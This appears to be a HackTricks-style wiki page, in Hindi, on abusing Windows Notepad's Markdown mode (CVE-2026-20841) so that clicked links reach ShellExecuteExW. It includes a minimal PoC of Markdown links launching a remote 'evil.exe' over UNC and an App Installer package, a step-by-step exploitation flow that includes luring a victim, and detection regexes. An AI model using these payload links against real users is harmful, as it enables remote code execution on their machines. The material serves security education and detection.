# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown या HTML रेंडर करने वाले Windows applications, क्लिक किए गए targets को `ShellExecuteExW` को सौंप सकते हैं। चूँकि ShellExecute, registered URI schemes और file associations को dispatch करता है, इसलिए renderer को यह मानने के बजाय कि हर link HTTP(S) है, स्पष्ट allowlist का उपयोग करना चाहिए। नीचे Notepad का व्यवहार CVE-2026-20841 के बारे में है और इसे हर renderer पर लागू नहीं मानना चाहिए।<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown mode में ShellExecuteExW का दायरा
- Notepad, `sub_1400ED5D0()` में fixed string comparison के ज़रिए **केवल `.md` extensions** के लिए Markdown mode चुनता है।<sup>[[1]](#references)</sup>
- समर्थित Markdown links:
  - Standard: `[text](target)`
  - Autolink: `<target>` (जिसे `[target](target)` के रूप में render किया जाता है), इसलिए payloads और detections के लिए दोनों syntaxes मायने रखते हैं।
- Link clicks को `sub_140170F60()` में process किया जाता है, जो कमज़ोर filtering करता है और फिर `ShellExecuteExW` को call करता है।
- `ShellExecuteExW`, केवल HTTP(S) ही नहीं, **किसी भी configured protocol handler** को dispatch करता है।<sup>[[1]](#references)</sup>

### Payload से जुड़ी बातें
- Link में मौजूद कोई भी `\\` sequence, `ShellExecuteExW` से पहले `\` में **normalize** हो जाता है, जिससे UNC/path crafting और detection प्रभावित होते हैं।
- `.md` files, **डिफ़ॉल्ट रूप से Notepad से associated नहीं होतीं**; victim को फिर भी file को Notepad में खोलकर link पर click करना होगा, लेकिन render होने के बाद link पर click किया जा सकता है।
- ख़तरनाक उदाहरण schemes:<sup>[[1]](#references)</sup>
  - Local/UNC payload launch करने के लिए `file://`।
  - App Installer flows trigger करने के लिए `ms-appinstaller://`। अन्य locally registered schemes का भी दुरुपयोग किया जा सकता है।

### न्यूनतम PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Exploitation flow
1. एक **`.md` file** बनाएं, ताकि Notepad उसे Markdown के रूप में रेंडर करे।
2. किसी खतरनाक URI scheme (`file:`, `ms-appinstaller:`, या किसी इंस्टॉल किए गए handler) का इस्तेमाल करके एक link एम्बेड करें।
3. File को वितरित करें (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB या इसी तरह के माध्यम से) और उपयोगकर्ता को उसे Notepad में खोलने के लिए मनाएं।
4. क्लिक करने पर, **normalized link** को `ShellExecuteExW` को सौंप दिया जाता है और संबंधित protocol handler उपयोगकर्ता के context में संदर्भित content को execute करता है।<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- उन ports/protocols पर `.md` files के transfer की निगरानी करें, जिनका इस्तेमाल आम तौर पर documents वितरित करने के लिए होता है: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`।
- Markdown links (standard और autolink) को parse करें और **case-insensitive** `file:` या `ms-appinstaller:` खोजें।
- Remote resource access पकड़ने के लिए vendor-guided regexes:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI द्वारा बताए गए vendor fix में स्वीकार किए जाने वाले targets को local files और HTTP(S) तक सीमित किया गया है। जरूरत के अनुसार अन्य installed protocol handlers के लिए भी detections बढ़ाएँ, क्योंकि registered attack surface हर system पर अलग होता है।<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Windows Notepad में मनमाना कोड निष्पादन](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
